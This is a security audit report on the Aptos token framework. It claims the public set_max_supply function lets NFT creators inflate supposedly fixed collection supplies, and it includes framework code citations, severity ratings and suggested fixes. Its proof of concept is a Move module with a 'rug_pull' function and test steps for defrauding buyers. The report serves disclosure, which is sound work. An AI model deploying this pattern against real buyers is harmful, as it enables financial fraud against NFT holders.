# Audit Report

## Title
NFT Collection Supply Manipulation via Public set_max_supply Function

## Summary
The `collection.move` module exposes a public `set_max_supply` function that allows collection creators with a stored `MutatorRef` to arbitrarily increase the maximum supply of "fixed supply" collections after creation, enabling supply manipulation attacks and rug pulls against NFT holders.

## Finding Description

The `FixedSupply` struct in the Aptos token framework is designed to enforce a fixed maximum supply for NFT collections. However, the `set_max_supply` function allows modification of this supposedly "fixed" constraint. [1](#0-0) 

The vulnerability exists in the public `set_max_supply` function: [2](#0-1) 

**Attack Scenario:**

1. A malicious creator writes a custom Move module that calls `collection::create_fixed_collection` with a low max_supply (e.g., 100 NFTs)
2. The creator stores the `MutatorRef` obtained via `collection::generate_mutator_ref` in their module's resources
3. NFTs are sold at premium prices based on the claimed scarcity
4. After sales complete, the creator calls `set_max_supply` to increase the limit to 10,000 or `u64::MAX`
5. The creator mints thousands more NFTs, destroying the value of original holders' tokens

**Key Issue:** The only validation is `max_supply >= current_supply` - there are no upper bounds, governance requirements, time locks, or mechanisms to prevent post-creation supply inflation. [3](#0-2) 

**Evidence of Risk Awareness:** The standard `aptos_token` module deliberately does NOT expose a wrapper function for `set_max_supply`, despite exposing wrappers for other collection mutations like `set_description` and `set_uri`: [4](#0-3) [5](#0-4) 

This suggests the Aptos team recognized the risks but left the underlying function public, creating an exploitable attack vector for custom collection modules.

## Impact Explanation

**Severity: Medium**

This vulnerability enables **limited funds loss or manipulation** through NFT value destruction:

- NFT holders who purchased tokens believing in guaranteed scarcity suffer financial losses when supply is inflated
- The attack doesn't directly steal funds but manipulates asset value through supply changes
- Potential damage scales with collection value and holder count
- Could undermine trust in the Aptos NFT ecosystem if widely exploited

This aligns with the Medium Severity category: "Limited funds loss or manipulation" and "State inconsistencies requiring intervention" (per bug bounty criteria).

## Likelihood Explanation

**Likelihood: Medium**

- Requires the attacker to be a collection creator (not highly privileged)
- Requires writing a custom Move module (moderate technical barrier)
- Strong economic incentive exists for malicious actors to execute rug pulls
- The standard `aptos_token` implementation provides protection, but custom modules bypass this
- Users have no on-chain mechanism to verify if a collection stores a mutable `MutatorRef`

## Recommendation

1. **Make `set_max_supply` a `friend` function** - Restrict access to trusted modules only, not public visibility

2. **Add governance controls** - Require community voting or multi-sig approval for supply increases

3. **Implement time locks** - Add mandatory waiting periods before supply changes take effect

4. **Add supply increase limits** - Cap increases to a percentage (e.g., 10%) of current max_supply per transaction

5. **Enhanced transparency** - Add view functions to check if a collection has stored mutable capabilities

**Recommended Fix:**

```move
// Change from public to friend-only or add access controls
friend fun set_max_supply(mutator_ref: &MutatorRef, max_supply: u64) acquires ConcurrentSupply, FixedSupply {
    // Add governance check
    assert!(governance::has_approved_supply_change(mutator_ref.self, max_supply), error::permission_denied(EUNAUTHORIZED_SUPPLY_CHANGE));
    
    // Add time lock
    let last_change = get_last_supply_change_time(mutator_ref.self);
    assert!(timestamp::now_seconds() >= last_change + SUPPLY_CHANGE_DELAY, error::invalid_state(ESUPPLY_CHANGE_TOO_SOON));
    
    // Existing validation
    // ... rest of implementation
}
```

## Proof of Concept

```move
module attacker::malicious_collection {
    use std::signer;
    use std::string;
    use std::option;
    use aptos_token_objects::collection;
    
    struct MaliciousCollection has key {
        mutator_ref: collection::MutatorRef,
    }
    
    // Step 1: Create "limited edition" collection
    public entry fun create_limited_collection(creator: &signer) {
        let constructor_ref = collection::create_fixed_collection(
            creator,
            string::utf8(b"Rare NFT Collection"),
            100, // Advertise only 100 NFTs!
            string::utf8(b"RareNFT"),
            option::none(),
            string::utf8(b"https://rare-nft.com"),
        );
        
        // Store MutatorRef for later manipulation
        let mutator_ref = collection::generate_mutator_ref(&constructor_ref);
        move_to(creator, MaliciousCollection { mutator_ref });
    }
    
    // Step 2: After selling all NFTs at premium prices...
    public entry fun rug_pull(creator: &signer) acquires MaliciousCollection {
        let creator_addr = signer::address_of(creator);
        let malicious = borrow_global<MaliciousCollection>(creator_addr);
        
        // Increase supply to 10,000 - destroying scarcity!
        collection::set_max_supply(&malicious.mutator_ref, 10000);
        
        // Now mint 9,900 more NFTs and dump on market
    }
}
```

**Test Execution:**
1. Deploy `malicious_collection` module
2. Call `create_limited_collection` - collection shows max_supply = 100
3. Sell 100 NFTs to users at premium prices
4. Call `rug_pull` - max_supply increases to 10,000
5. Original holders' NFTs lose 99% of their scarcity value

## Notes

The indexer file mentioned in the security question simply reads and stores the on-chain `FixedSupply` data. The core issue exists in the Move framework where `max_supply` is modifiable through the public `set_max_supply` function, which the indexer will faithfully reflect as the value changes on-chain. [6](#0-5)

### Citations

**File:** aptos-move/framework/aptos-token-objects/sources/collection.move (L100-111)
```text
    /// Fixed supply tracker, this is useful for ensuring that a limited number of tokens are minted.
    /// and adding events and supply tracking to a collection.
    struct FixedSupply has key {
        /// Total minted - total burned
        current_supply: u64,
        max_supply: u64,
        total_minted: u64,
        /// Emitted upon burning a Token.
        burn_events: event::EventHandle<BurnEvent>,
        /// Emitted upon minting an Token.
        mint_events: event::EventHandle<MintEvent>,
    }
```

**File:** aptos-move/framework/aptos-token-objects/sources/collection.move (L709-737)
```text
    public fun set_max_supply(mutator_ref: &MutatorRef, max_supply: u64) acquires ConcurrentSupply, FixedSupply {
        let collection = object::address_to_object<Collection>(mutator_ref.self);
        let collection_address = object::object_address(&collection);
        let old_max_supply;

        if (exists<ConcurrentSupply>(collection_address)) {
            let supply = &mut ConcurrentSupply[collection_address];
            let current_supply = aggregator_v2::read(&supply.current_supply);
            assert!(
                max_supply >= current_supply,
                error::out_of_range(EINVALID_MAX_SUPPLY),
            );
            old_max_supply = aggregator_v2::max_value(&supply.current_supply);
            supply.current_supply = aggregator_v2::create_aggregator(max_supply);
            aggregator_v2::add(&mut supply.current_supply, current_supply);
        } else if (exists<FixedSupply>(collection_address)) {
            let supply = &mut FixedSupply[collection_address];
            assert!(
                max_supply >= supply.current_supply,
                error::out_of_range(EINVALID_MAX_SUPPLY),
            );
            old_max_supply = supply.max_supply;
            supply.max_supply = max_supply;
        } else {
            abort error::invalid_argument(ENO_MAX_SUPPLY_IN_COLLECTION)
        };

        event::emit(SetMaxSupply { collection, old_max_supply, new_max_supply: max_supply });
    }
```

**File:** aptos-move/framework/aptos-token-objects/sources/aptos_token.move (L620-631)
```text
    public entry fun set_collection_description<T: key>(
        creator: &signer,
        collection: Object<T>,
        description: String,
    ) acquires AptosCollection {
        let aptos_collection = authorized_borrow_collection(&collection, creator);
        assert!(
            aptos_collection.mutable_description,
            error::permission_denied(EFIELD_NOT_MUTABLE),
        );
        collection::set_description(aptos_collection.mutator_ref.borrow(), description);
    }
```

**File:** aptos-move/framework/aptos-token-objects/sources/aptos_token.move (L657-668)
```text
    public entry fun set_collection_uri<T: key>(
        creator: &signer,
        collection: Object<T>,
        uri: String,
    ) acquires AptosCollection {
        let aptos_collection = authorized_borrow_collection(&collection, creator);
        assert!(
            aptos_collection.mutable_uri,
            error::permission_denied(EFIELD_NOT_MUTABLE),
        );
        collection::set_uri(aptos_collection.mutator_ref.borrow(), uri);
    }
```

**File:** crates/indexer/src/models/token_models/v2_token_utils.rs (L246-254)
```rust
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct FixedSupply {
    #[serde(deserialize_with = "deserialize_from_string")]
    pub current_supply: BigDecimal,
    #[serde(deserialize_with = "deserialize_from_string")]
    pub max_supply: BigDecimal,
    #[serde(deserialize_with = "deserialize_from_string")]
    pub total_minted: BigDecimal,
}
```
